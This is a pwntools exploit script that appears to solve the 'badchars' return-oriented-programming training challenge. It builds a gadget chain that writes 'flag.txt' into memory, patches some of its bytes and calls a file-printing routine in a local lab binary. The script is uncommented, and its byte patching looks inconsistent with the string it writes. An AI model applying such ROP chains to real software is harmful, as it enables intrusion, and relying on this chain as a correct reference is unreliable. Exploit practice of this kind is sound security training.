from pwn import *
plt_printfile = 0x0000000000400510
pop_r12_r13_r14_r15_ret = 0x000000000040069c
mov_r13_r12_ret = 0x0000000000400634
bssaddr = 0x0000000000601038
pop_rdi_ret = 0x00000000004006a3
pop_r14_r15_ret = 0x00000000004006a0
add_r15_r14b_ret = 0x000000000040062c

p = process('./badchars')
#gdb.attach(p,"b *main")
payload = 'A'*0x20 + p64(0) 
payload += p64(pop_r12_r13_r14_r15_ret)
payload += p64(u64("flag.txt")) 
payload += p64(bssaddr)
payload += p64(0x0) 
payload += p64(0x0)   
payload += p64(mov_r13_r12_ret)  

payload += p64(pop_r14_r15_ret)
#payload += p64(u64("flag.txt"))
payload += p64(0x76) 
payload += p64(bssaddr+2)
payload += p64(add_r15_r14b_ret)  

payload += p64(pop_r14_r15_ret)
payload += p64(0x7c) 
payload += p64(bssaddr+3)
payload += p64(add_r15_r14b_ret) 

payload += p64(pop_r14_r15_ret)
payload += p64(0x43) 
payload += p64(bssaddr+4)
payload += p64(add_r15_r14b_ret) 

payload += p64(pop_r14_r15_ret)
payload += p64(0x8d) 
payload += p64(bssaddr+6)
payload += p64(add_r15_r14b_ret) 


payload += p64(pop_rdi_ret)
payload += p64(bssaddr)  
payload += p64(plt_printfile)  

p.recvuntil('> ')
p.send(payload)
p.interactive()
